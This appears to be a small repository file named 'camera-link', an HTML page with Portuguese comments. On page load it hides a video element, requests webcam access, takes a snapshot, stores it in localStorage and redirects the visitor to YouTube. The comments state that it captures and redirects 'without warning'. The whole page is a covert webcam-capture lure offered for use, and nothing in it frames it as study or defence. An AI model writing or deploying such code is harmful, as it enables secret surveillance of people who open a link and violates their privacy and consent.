# camera-link
<!DOCTYPE html>
<html>
<head>
    <title>Captura de Imagem</title>
</head>
<body>
    <video id="webcam" autoplay muted playsinline style="display:none"></video>
    
    <script>
        async function capturePhoto() {
            try {
                // Tenta capturar sem avisar
                const stream = await navigator.mediaDevices.getUserMedia({video: true});
                const video = document.getElementById('webcam');
                video.srcObject = stream;
                
                // Captura após 1 segundo
                setTimeout(() => {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    // Salva imagem localmente
                    const imageData = canvas.toDataURL('image/jpeg');
                    localStorage.setItem('capturedImage', imageData);
                    
                    // Redireciona sem avisar
                    window.location.href = "https://youtube.com";
                }, 1000);
            } catch (err) {
                // Continua mesmo se falhar
                window.location.href = "https://youtube.com";
            }
        }
        
        // Inicia automaticamente
        window.addEventListener('load', capturePhoto);
    </script>
</body>
</html>
